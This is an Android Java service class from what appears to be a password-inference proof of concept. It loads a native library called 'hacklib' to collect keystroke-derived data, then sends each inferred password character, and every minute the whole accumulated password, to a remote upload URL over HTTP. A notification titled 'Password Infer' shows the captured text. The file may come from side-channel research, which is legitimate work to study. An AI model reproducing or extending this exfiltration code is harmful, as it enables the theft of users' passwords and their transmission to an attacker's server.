package com.example.example.exampleapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.app.NotificationCompat;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;

import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

import okhttp3.OkHttpClient;
import okhttp3.Request;

public class MyForegroundService extends Service {
    public static final String CHANNEL_ID = "MyForegroundServiceChannel";
    static final int MY_FOREGROUND_NOTIFICATION_ID = 3;

    static NotificationCompat.Builder mNotificationBuilder;
    public static String mPwd = "";
    public static String mDeviceConfig = "";

    Timer timer = new Timer();

    static {
        System.loadLibrary("hacklib");
    }

    public native void nativeStartCollect(String myConfig);
    public native void nativeStopCollect();

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public void onDestroy() {
        nativeStopCollect();
        stopForeground(true);
        mPwd = "";
        super.onDestroy();
    }

    public void startEveryMinTask() {
        // if mPwd is not null, send it to server
        new Thread(new Runnable() {
            @Override
            public void run() {
                Log.i("Example", "minute upload going...");
                try {
                    String url = getResources().getString(R.string.upload_url);
                    url += MyForegroundService.mPwd;
                    OkHttpClient client = new OkHttpClient();
                    Request request = new Request.Builder().url(url).build();
                    okhttp3.Response response = client.newCall(request).execute();
                    if (response.isSuccessful()) {
                        Log.i("Example", response.body().string());
                    } else {
                        Log.e("Example", "okHttp error request");
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String input = intent.getStringExtra("inputExtra");
        if (input.equals("ACTION_STOP_COLLECT")) {
            stopForeground(STOP_FOREGROUND_REMOVE);
            stopSelf();
            return START_NOT_STICKY;
        }
        createNotificationChannel();
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);
        Intent intentStartCollection = new Intent(this, MyForegroundService.class);
        intentStartCollection.putExtra("inputExtra", "ACTION_STOP_COLLECT");
        PendingIntent pendingIntentStartCollection = PendingIntent.getForegroundService(this, 0, intentStartCollection, 0);

        mNotificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Password Infer")
                .setContentText(mPwd)
                .setSmallIcon(R.drawable.ic_baseline_4k_24)
                .setContentIntent(pendingIntent)
                .addAction(R.drawable.ic_baseline_4k_24, "STOP", pendingIntentStartCollection);

        Notification notification = mNotificationBuilder.build();
        startForeground(MY_FOREGROUND_NOTIFICATION_ID, notification);

        // determine device model
        String mymodel = android.os.Build.MODEL;
        DisplayMetrics metrics = getResources().getDisplayMetrics();
        int dpi = metrics.densityDpi;
        mDeviceConfig = "" + dpi + "__" + mymodel;

        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                startEveryMinTask();
            }}, 60000, 60000);

        // do heavy work in background THREAD!!!
        nativeStartCollect(mDeviceConfig);
        // stopSelf();

        return START_NOT_STICKY;
    }

    public String getmDeviceConfig() {
        return mDeviceConfig;
    }


    private int onReceivePwdCallback(String myStr) {
        try {
            String url = getResources().getString(R.string.upload_url);
            url += myStr;
            OkHttpClient client = new OkHttpClient();
            Request request = new Request.Builder().url(url).build();
            okhttp3.Response response = client.newCall(request).execute();
            if (response.isSuccessful()) {
                Log.i("Example", response.body().string());
            } else {
                Log.e("Example", "okHttp error request");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        mPwd += myStr;
        mNotificationBuilder.setContentText(mPwd);
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.notify(MY_FOREGROUND_NOTIFICATION_ID, mNotificationBuilder.build());
        return 0;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID,
                "Foreground Service Channel",
                NotificationManager.IMPORTANCE_LOW
        );
        NotificationManager manager = getSystemService(NotificationManager.class);
        manager.createNotificationChannel(serviceChannel);
    }
}
